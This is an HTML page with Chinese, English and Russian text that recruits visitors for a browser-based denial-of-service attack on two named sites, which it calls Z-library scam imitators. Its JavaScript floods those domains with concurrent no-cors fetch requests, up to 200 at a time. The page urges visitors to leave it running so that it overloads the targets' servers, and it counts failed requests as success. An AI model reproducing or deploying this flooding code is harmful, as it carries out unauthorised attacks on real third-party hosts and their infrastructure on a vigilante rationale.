<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>向无耻的诈骗站开炮！</title>

    <link href="bootstrap.min.css" rel="stylesheet"
    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <script src="bootstrap.min.js"
        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
        crossorigin="anonymous"></script>

    <style>
        body {
            padding: 0;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #CCCCCC;
        }

        .title {
            margin: 3rem auto 3rem auto;
            text-align: center;
            color: #FFFFFF;
        }

        .intro .howto {
            background-color: #330099;
        }

        .intro .howto h3 {
            color: #FFFFFF;
            text-align: center;
            margin-top: 1rem;
        }

        .intro .howto p {
            color: white;
            text-align: justify;
        }

        .footer {
            color: #005BBC;
            text-align: center;
            margin-top: 2rem;
        }

        .desc{
            color:black;
            padding-top: 2rem;
            padding-bottom: 2rem;
            margin: 0 auto;
            width: 60%;
        }

        .desc h3 {
            text-align: center;
            color: #005BBC;
        }

        #stats h4 {
            font-size: 1.1em;
            text-decoration: underline;
            color: #005BBC;
            font-weight: 400;
        }

        table.status {
            margin-bottom: 10px;
        }
    </style>
</head>

<body>
    <div class="modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
        <div class="modal-dialog modal-dialog-centered" role="document">
          <div class="modal-content">
            <div class="modal-header">
              <h5 class="modal-title" id="exampleModalLabel">警告，你确认要DOS那些模仿Z-library的诈骗站吗？</h5>
            </div>
            <div class="modal-body">
              <p>我收集了一些无耻的模仿Z-library的诈骗网站，它们模仿Z-library，利用人们对自由知识的渴望敛财，并且攻击真正的Z-library，如果你愿意支持Z-library，那么请点击确认，随后浏览器会自动开始DOS那些诈骗站</p>
              <hr>
              <p>I have collected some shameless scam websites that imitate Z-library. They imitate Z-library, exploit people's desire for free knowledge to make money, and attack the real Z-library. If you are willing to support Z-library, then please click to confirm. Then the browser will automatically start DOS those scam sites
            </p>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-secondary" onclick="window.location.href='https://space.bilibili.com/19585141?spm_id_from=333.1369.opus.module_author_avatar.click'">离开</button>
              <button type="button" class="btn btn-primary" data-dismiss="exampleModalLabel" onclick="togglePause(); myModal.toggle();">确认</button>
            </div>
          </div>
        </div>
      </div>

    <h1 class="title">向无耻的诈骗网站开炮！</h1>
    <div class="intro container">
        <div class="row">
            <div class="howto col-lg-4 col-sm-12">
                <h3>中文</h3>
                <p>提示，你可以简单地保存该网页并在本地运行，以及查看源代码，你会发现它是一个完全运行在浏览器的HTML文件</p>
                <p>这是一些无耻的模仿Z-library的诈骗网站，它们模仿Z-library的页面，
                    利用人们对自由知识的渴望敛财，并且在背后攻击真正的Z-library，
                    如果你愿意支持Z-library，那么请点击确认，随后浏览器会自动开始DOS那些诈骗站</p>
                <p>请打开此页面并让它在你的浏览器里运行，它将淹没诈骗网站并对其网络设施造成巨大负载</p>
            </div>
            <div class="howto col-lg-4 col-sm-12">
                <h3>English version</h3>
                <p>Tip, you can simply save the page and run it locally, as well as view the source code and you'll see that it's an HTML file that runs entirely in the browser</p>
                <p>These are some shameless scam websites that imitate Z-library. They imitate Z-library’s pages.Taking advantage of people's desire for free knowledge to make money, and attacking the real Z-library behind the scenes,If you are willing to support Z-library, then please click Confirm, and then the browser will automatically start DOS those scam sites</p>
                <p>Please open this page and let it run in your browser, it will flood the scam websites and put a huge load on their network facilities
                </p>
            </div>
            <div class="howto col-lg-4 col-sm-12">
                <h3>русская версия</h3>
                <p>Совет: вы можете просто сохранить страницу и запустить ее локально, а также просмотреть исходный код, и вы увидите, что это HTML-файл, который полностью запускается в браузере.</p>
                <p>Это несколько бесстыдных мошеннических сайтов, имитирующих Z-библиотеку. Они имитируют страницы Z-библиотеки.Воспользовавшись стремлением людей к бесплатным знаниям, чтобы заработать деньги, и закулисно атакуя настоящую Z-библиотеку,Если вы готовы поддерживать Z-библиотеку, нажмите «Подтвердить», и тогда браузер автоматически запустит DOS на этих мошеннических сайтах.</p>
                <p>Пожалуйста, откройте эту страницу и запустите ее в своем браузере, она заполонит мошеннические веб-сайты и создаст огромную нагрузку на их сетевые ресурсы.</p>
            </div>
        </div>
    </div>

    <div class="desc text-center">
    <h3>攻击进度</h3>
    <p>你向每个诈骗网站的 GET 请求和错误响应数量如下所示。获取失败是正常现象！这意味着他们的服务器超载并丢包  -- 这就是目标！</p>
    <p>请求总数： <span id="totalrequests">0</span></p>
    <p>错误数量 <span id="totalerrors">0</span></p>
    <button type="button" class="btn btn-primary" onclick="togglePause();">Resume</button>
    </div>

    <div id="stats" class="container">
        <div class="row">
        </div>
    </div>

    <script>        
        // target list
        var urls = [
            'https://z-lib.id/',        
            'https://z-lib.io/'
        ];

        // initialize variables
        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
        var statRow = document.querySelector("#stats > .row");
        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
        var CONCURRENCY_LIMIT = 200;
        var queue = [];
        var attack = false;
        var totalrequests = 0;
        var totalerrors = 0;

        function togglePause () {
            if (attack) {
                attack = false;
                document.querySelector("div.desc .btn").innerText = "恢复";
            } else {
                attack = true;
                document.querySelector("div.desc .btn").innerText = "暂停";
                for (var i=0; i<urls.length; i++) {
                    flood(i);
                }
            }
        }

        async function fetchWithTimeout(resource, options) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), options.timeout);
            return fetch(resource, {
                signal: controller.signal,
                mode: 'no-cors'
            }).then((response) => {
                clearTimeout(id);
                return response;
            }).catch((error) => {
                clearTimeout(id);
                throw error;
            });
        }

        async function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }         

        async function flood(n) {
            const url = urls[n];
            const target = targets[url];

            while (attack) {
                if (queue.length > CONCURRENCY_LIMIT) {
                    await queue.shift();
                }
                queue.push(
                    fetchWithTimeout(url, { timeout: 2000 })
                        .catch((error) => {
                            if (error.code === 20 /* ABORT */) {
                                return;
                            }
                            target.number_of_errored_responses++;
                            target.error_message = error.message;
                            totalerrors++;
                        })
                        .then((response) => {
                            if (response && !response.ok) {
                                target.number_of_errored_responses++;
                                target.error_message = response.statusText;
                                totalerrors++;
                            }
                            target.number_of_requests++;
                        })
                        .finally(() => updateTargetDisplay(n))
                );

                await sleep(1);
            }
        }

        // Update data for target n
        function updateTargetDisplay(n) {
            var url = urls[n];
            var {number_of_requests, number_of_errored_responses} = targets[url];
            var requests_cell = document.querySelector(`#target${n} .requests`);
            var errors_cell = document.querySelector(`#target${n} .errors`);
            requests_cell.innerText = number_of_requests;
            errors_cell.innerText = number_of_errored_responses;
            document.querySelector("#totalrequests").innerText = totalrequests;
            document.querySelector("#totalerrors").innerText = totalerrors;
        }

        // Shuffle array order before starting
        for (let i = urls.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [urls[i], urls[j]] = [urls[j], urls[i]];
        }

        // Create div for each target
        for (var i=0; i<urls.length; i++) {
            statRow.innerHTML += `
                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
                    <h4>${urls[i]}</h4>
                    <table class='status'>
                        <tr><td>请求数:</td><td class="requests">0</td></tr>
                        </tr><td>失败:</td><td class="errors">0</td></tr>
                    </table>
                </div>
            `;
        }

        // Show warning window
        myModal.toggle();

    </script>
</body>

</html>
